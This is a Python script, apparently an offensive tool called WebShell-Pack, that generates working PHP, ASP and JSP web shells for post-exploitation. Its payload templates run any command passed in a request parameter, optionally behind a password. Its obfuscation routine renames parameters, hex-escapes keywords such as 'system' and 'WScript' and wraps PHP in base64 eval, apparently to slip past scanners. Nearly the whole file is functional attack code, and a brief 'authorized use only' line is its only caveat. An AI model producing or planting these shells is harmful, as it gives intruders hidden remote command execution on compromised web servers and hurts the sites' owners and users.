#!/usr/bin/env python3
"""
WebShell-Pack — Minimal web shell generator for post-exploitation.
Generates PHP, ASP, and JSP one-liner web shells with configurable
auth and obfuscation. Authorized use only.
"""

import argparse
import base64
import os
import random
import sys

__version__ = "1.0.0"

# ---------------------------------------------------------------------------
# Raw payload templates — shortest possible per language
# ---------------------------------------------------------------------------

PAYLOADS = {
    "php": {
        "raw": "<?php system(base64_decode($_GET['c']));?>",
        "with_auth": "<?php $k='%s';if($_GET['k']!==$k)die('0');system(base64_decode($_GET['c']));?>",
    },
    "asp": {
        "raw": "<%Dim c,p,o:c=Request(\"c\"):Set o=CreateObject(\"WScript.Shell\"):Set p=o.Exec(c):Response.Write(p.StdOut.ReadAll):p.Close:Set o=Nothing%>",
        "with_auth": "<%Dim k,c,p,o:k=\"%s\":if Request(\"k\")<>k then Response.Write(\"0\"):Response.End end if:c=Request(\"c\"):Set o=CreateObject(\"WScript.Shell\"):Set p=o.Exec(c):Response.Write(p.StdOut.ReadAll):p.Close:Set o=Nothing%>",
    },
    "jsp": {
        "raw": "<%@page import=\"java.io.*\"%><%String c=request.getParameter(\"c\");Process p=Runtime.getRuntime().exec(c);BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null)out.println(l);%>",
        "with_auth": "<%@page import=\"java.io.*\"%><%String k=\"%s\";if(!request.getParameter(\"k\").equals(k)){out.print(\"0\");return;}String c=request.getParameter(\"c\");Process p=Runtime.getRuntime().exec(c);BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null)out.println(l);%>",
    },
}


def obfuscate(template: str, level: str, shell_type: str = "php") -> str:
    """Apply obfuscation transformations to shell code."""
    if level == "none":
        return template
    code = template

    if level in ("low", "medium", "high"):
        var_map = {"c": random.choice(["x", "z", "q", "cmd", "r"]),
                   "k": random.choice(["a", "s", "t", "key", "_"])}
        for old, new in var_map.items():
            code = code.replace(f'"{old}"', f'"{new}"')
            code = code.replace(f"'{old}'", f"'{new}'")

    if level in ("medium", "high"):
        for kw in ["system", "exec", "Runtime", "CreateObject", "WScript"]:
            if kw in code:
                code = code.replace(kw, "".join(f"\\x{ord(c):02x}" for c in kw))

    if level == "high" and shell_type == "php":
        b64 = base64.b64encode(code.encode()).decode()
        code = "<?php eval(base64_decode('" + b64 + "'));?>"

    return code


def generate(shell_type: str, auth: str = "", obf_level: str = "none",
             minimal: bool = False) -> str:
    """Generate a web shell of the given type."""
    tmpl_set = PAYLOADS.get(shell_type.lower())
    if not tmpl_set:
        raise ValueError(f"Unsupported shell type: {shell_type}")

    if auth and not minimal:
        template = tmpl_set["with_auth"] % auth
    else:
        template = tmpl_set["raw"]

    if minimal:
        template = tmpl_set["raw"].replace(" ", "").replace("\n", "")

    if obf_level != "none" and not minimal:
        template = obfuscate(template, obf_level, shell_type)

    return template


def save(shell_code: str, output_path: str):
    """Write generated shell to file."""
    os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)
    with open(output_path, "w") as f:
        f.write(shell_code)
    print(f"[+] Written: {output_path} ({len(shell_code)} bytes)")


def cli():
    parser = argparse.ArgumentParser(
        description="WebShell-Pack v%s — minimal web shell generator" % __version__)
    parser.add_argument("-t", "--type", choices=["php", "asp", "jsp"],
                        default="php", help="Shell type")
    parser.add_argument("-a", "--auth", default="", help="Auth password")
    parser.add_argument("-o", "--obfuscate", choices=["none", "low", "medium", "high"],
                        default="none", help="Obfuscation level")
    parser.add_argument("-m", "--minimal", action="store_true",
                        help="Generate smallest possible shell (ignores auth/obfuscation)")
    parser.add_argument("-O", "--output", default="", help="Output file path")
    args = parser.parse_args()

    code = generate(args.type, args.auth, args.obfuscate, args.minimal)
    out = args.output or f"shell.{args.type}"
    save(code, out)


if __name__ == "__main__":
    cli()
